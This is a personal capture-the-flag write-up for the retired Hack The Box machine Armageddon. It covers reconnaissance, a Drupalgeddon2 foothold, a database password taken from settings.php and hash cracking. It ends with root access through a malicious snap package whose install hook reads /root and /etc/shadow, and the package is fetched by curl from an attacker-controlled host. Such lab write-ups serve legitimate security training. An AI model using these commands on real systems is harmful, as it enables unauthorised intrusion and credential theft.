---
tags:
  - HTB
  - Retired
  - Linux
  - Drupal
  - Snap
creation date: 2021-03-27
Date Completed: 2024-09-14
CVEs: CVE-2018-7600
URL: https://app.hackthebox.com/machines/Armageddon/information
IP: 10.129.16.68
---
## Information Gathering
### Nmap (Ports/Services)
```
sudo nmap -sT -sV -sC -O -p- -T4 --min-rate=1000 $IP  
```

```
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Welcome to  Armageddon |  Armageddon
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16

```

### ffuf (Directories/Subdomain/Files)
```session
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt:FUZZ -u $URL/FUZZ
```

```session
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt:FUZZ -u $URL/FUZZ
```

```session
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u $URL -H "HOST: FUZZ.domain.htb"
```

### Nikto (Identify Technology)

Drupal 7
Server: Apache/2.4.6 (CentOS) PHP/5.4.16

## Foothold
Drupalgeddon2
unix/webapp/drupal_drupalgeddon2

### System Enumeration

![[Pasted image 20240914091807.png]]

### Drupal 
![[Pasted image 20240914095237.png]]

find / -iname settings.php 2>/dev/null
/var/www/html/sites/default/settings.php
![[Pasted image 20240914095057.png]]
`drupaluser:CQHEy@9M*m23gBVj

```
mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -e 'show databases'
mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -e 'use drupal;show tables'
mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -e 'use drupal;show tables;select * from users'
```

![[Pasted image 20240914101828.png]]

```
hashcat -m 7900 bruce_hash /opt/tools/SecLists/Passwords/xato-net-10-million-passwords.txt
```

![[Pasted image 20240914102349.png]]


## Privilege Escalation

![[Pasted image 20240914103321.png]]

https://gtfobins.github.io/gtfobins/snap/

Install fpm and run to get root flag:
```
COMMAND='cat /root/root.txt'
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n hacked -s dir -t snap -a all meta
```

curl the malicious snap package over
```
curl http://10.10.15.64/hacked_1.0_all.snap -o hacked_1.0_all.snap
```

Run command:
```
sudo snap install hacked_1.0_all.snap --dangerous --devmode
```

## more fun
trying to get a reverse shell as root
i tried every reve shell i could find. so i'm back to enumerating as root and waiting to see if the password cracks...

```
COMMAND='cat /etc/shadow'
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n hacked -s dir -t snap -a all meta
```

```
COMMAND='ls -lah /root/'
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n hacked -s dir -t snap -a all meta
```

```
COMMAND='cat /root/passwd'
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n hacked -s dir -t snap -a all meta
```

```
COMMAND='cat /root/reset.sh && cat /root/cleanup.sh'
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n hacked -s dir -t snap -a all meta
```